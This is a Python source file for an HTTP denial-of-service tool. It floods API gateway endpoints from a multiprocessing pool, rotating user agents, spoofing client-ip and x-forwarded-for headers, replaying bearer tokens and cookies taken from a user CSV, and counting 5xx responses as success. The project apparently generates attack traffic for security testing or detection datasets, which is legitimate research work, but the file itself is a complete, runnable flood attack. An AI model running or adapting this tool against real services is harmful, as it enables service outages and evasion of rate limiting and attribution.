import json
import multiprocessing
import os
import random
import sys
import time
from collections import defaultdict
from datetime import datetime
from multiprocessing import Pool

import pandas as pd
import requests
# disabling warnings
import urllib3
import yaml

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# To store user details
class User:
    def __init__(self, ip, token, cookie):
        self.ip = ip
        self.token = token
        self.cookie = cookie


# To store API details
class API:
    def __init__(self, protocol, host, port, context, version, name):
        self.protocol = protocol
        self.host = host
        self.port = port
        self.context = context
        self.name = name
        self.version = version
        self.resources = defaultdict(list)
        self.base_url = "{}://{}:{}/{}/{}".format(protocol, host, port, context, version)

    def add_resource(self, method, path):
        self.resources[method].append(path)


# Details of the attack
class DOSAttackData:

    # Initialisation.
    def __init__(self, api):
        self.headers_user_agents = []
        self.headers_referers = []
        self.dt = []
        self.api = api
        self.urlc = api.base_url
        self.users = []

    def useragent_list(self):
        """
        returns a list of user agents read from the user agent.txt
        """
        path = os.path.abspath(os.path.join(__file__, "../../data/user agents.txt"))
        with open(path, "r") as file:
            self.headers_user_agents = list(map(str.strip, file.readlines()))
        return self.headers_user_agents

    def parse_users(self, user_list):
        """
        Seperates user ip, tokem and cookie from a user list and make a list of user objects
        :param user_list: A list containing user details

        """
        for user in user_list:
            self.users.append(User(user[6], user[4], user[7]))  # 4 = token, 5 = ip, 7 = cookie

    # def corrupt(self):
    #     """
    #     Generates arbitrary data for the request body
    #
    #     """
    #     for i in range(number_of_requests.value):
    #         self.dt.append(generate_random_string(random.randint(1, 3)) + random.choice(['\a', '\n', '\t', '\b', '\r', '\f']) + generate_random_string(random.randint(1, 3)))


def generate_random_json():
    temp = defaultdict()
    for i in range(random.randint(0, 10)):
        temp[generate_random_string(random.randint(0, 10))] = generate_random_string(random.randint(0, 10))
    return json.dumps(temp)


def generate_random_string(size):
    """
    Generates random ascii string of given size.

    :param size: integer value
    :return: a string of given size
    """
    out_str = ''
    for i in range(size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return out_str


def set_flag(val):
    """
    Set the flag value which is used for a exit condition for the script
    :param val: an integer value
    :return: none
    """
    flag.value = val


def inc_counter():
    """
    Increment the request count variable shared across the processes
    :return: none
    """
    counter.value += 1


def inc_fault():
    """
    Increment the fault value shared across the processes
    :return: none
    """
    fault.value += 1


def init(ctr, fg, flt, time):
    """
    Initialize globals variables in a process memory space when the process pool is created

    """
    global counter, status, flag, fault, start_time
    counter = ctr
    flag = fg
    fault = flt
    start_time = time



def log_request(path, data, mode):
    """
    logs the data in the given path
    :param path: path to the log file
    :param data: data to be logged
    :param mode: mode to open the log file (ex: w, w+, a)

    """
    temp_path = os.path.abspath(os.path.join(__file__, path))
    with open(temp_path, mode) as file:
        file.write(data + "\n")


def send_request(num):
    """
    Send HTTP/HTTPS requests to a given API with the data in the DOSAttackData class
    :param num:
    :return: response code or done
    """
    inc_counter()
    code = 0
    api = attack_instance.api
    urlc = attack_instance.urlc
    if urlc.count("?") > 0:
        param_joiner = "&"
    else:
        param_joiner = "?"

    random_user = random.choice(attack_instance.users)
    resource_tuple = random.choice(list(api.resources.items()))
    method = resource_tuple[0]
    resource_path_list_for_a_method = resource_tuple[1]
    resource = random.choice(resource_path_list_for_a_method)

    header_data = {
        'User-Agent': random.choice(attack_instance.headers_user_agents),
        'accept': 'application/json',
        'client-ip': '{}'.format(random_user.ip),
        'x-forwarded-for': '{}'.format(random_user.ip),
        'cookie': '{}'.format(random_user.cookie),
        'Authorization': 'Bearer {}'.format(random_user.token)
    }

    urlreq = urlc + '/' + resource + param_joiner + generate_random_string(random.randint(random.randint(0, 3), random.randint(4, 10))) + '=' + generate_random_string(
        random.randint(random.randint(0, 3), random.randint(4, 10)))

    try:
        if method == 'GET':
            r = requests.get(url=urlreq, headers=header_data, timeout=(15, 30), verify=False)
        elif method == 'POST':
            r = requests.post(url=urlreq, headers=header_data, data=generate_random_json(), timeout=(15, 30), verify=False)
        elif method == 'PUT':
            r = requests.put(url=urlreq, headers=header_data, data=generate_random_json(), timeout=(15, 30), verify=False)
        elif method == 'DELETE':
            r = requests.delete(url=urlreq, headers=header_data, data=generate_random_json(), timeout=(15, 30), verify=False)
        elif method == 'PATCH':
            r = requests.patch(url=urlreq, headers=header_data, data=generate_random_json(), timeout=(15, 30), verify=False)

        if (str(r.status_code) == '500') or (str(r.status_code) == '503') or (str(r.status_code) == '504'):
            set_flag(1)
            print('Successful.')
            code = 500
        elif str(r.status_code) == '400':
            print('Url has DDoS protection.')
            sys.exit()
        elif str(r.status_code) == '404':
            print('Url does not exist.')
            sys.exit()
        elif str(r.status_code) == '429':
            print('Slowing down due to "Too many requests" error.', flush=True)
            time.sleep(20)
        elif str(r.status_code) == '405':
            r = requests.get(url=urlreq, headers=header_data, timeout=(15, 30))
        elif ("30" in str(r.status_code)) or ("40" in str(r.status_code)) or ("50" in str(r.status_code)):  # For other unexpected HTTPS errors, prints the error code.
            print(str(r.status_code))
        elif counter.value >= number_of_requests_per_api:
            code = "Done"
        else:
            print('Sending crafted request: %s' % urlreq, flush=True)

        request_string = str(datetime.now()) + "," + api.name + "," + random_user.token + "," + random_user.ip + "," + random_user.cookie + "," + urlreq + "," + method + "," + str(r.status_code)
        log_request("../../logs/attacktool.csv", request_string, "a")

    except Exception as e:
        print(str(e))
        inc_fault()
    return code


def handler_time(i):
    global attack_duration_per_api
    # attack_instance.corrupt()

    if datetime.now().timestamp() <= start_time.value + attack_duration_per_api:
        if flag.value < 2:
            code = send_request(i)
            if code == 500:
                set_flag(2)

            print("%d Requests Sent" % counter.value, flush=True)


def handler(i):
    # attack_instance.corrupt()
    attack_instance.useragent_list()
    if i < 10000 + fault.value:
        if flag.value < 2:
            code = send_request(i)
            if code == 500:
                set_flag(2)

            print("%d Requests Sent" % counter.value, flush=True)


def attack():
    start_time = multiprocessing.Value('f', datetime.now().timestamp())
    counter = multiprocessing.Value('i', 0)
    flag = multiprocessing.Value('i', 0)
    fault = multiprocessing.Value('i', 0)
    global number_of_requests_per_api
    p = Pool(processes=20, initializer=init, initargs=(counter, flag, fault, start_time))
    while datetime.now().timestamp() <= start_time.value + 2 * 60:
        p.map_async(handler_time, range(number_of_requests_per_api + fault.value))
        p.close()
        p.join()


if __name__ == "__main__":

    with open(os.path.abspath(os.path.join(__file__, "../../conf/config.yaml")), "r") as config_file:
        config_data = yaml.load(config_file, Loader=yaml.FullLoader)

    # configurations
    attack_duration_per_api = 5 * 60
    number_of_requests_per_api = 100000
    protocol = config_data['gateway-url']['protocol']
    host = config_data['gateway-url']['host']
    port = config_data['gateway-url']['port']

    # API Data
    api_list = []
    for api in config_data['apis']:
        api_instance = API(protocol, host, port, api['context'], api['version'], api['name'])
        for resource in api['resources']:
            api_instance.add_resource(resource['method'], resource['path'])
        api_list.append(api_instance)

    # User data
    user_details = pd.read_csv(os.path.abspath(os.path.join(__file__, "../../data/user_scenario_distribution_output.csv")))
    user_details_groups = user_details.groupby('api_name')

    # prepare log file
    log_request("../../logs/attacktool.csv", "timestamp,api,access_token,ip_address,cookie,invoke_path,http_method,response_code", "w")

    print("---------------------- DDOS Attack Started ----------------------")

    for api in api_list:
        print("Attacking API {}".format(api.name))
        user_data = user_details_groups.get_group(api.name).values.tolist()
        attack_instance = DOSAttackData(api)
        attack_instance.useragent_list()
        attack_instance.parse_users(user_data)
        attack()

    print("\n---------------------- DDOS Attack Finished ----------------------")
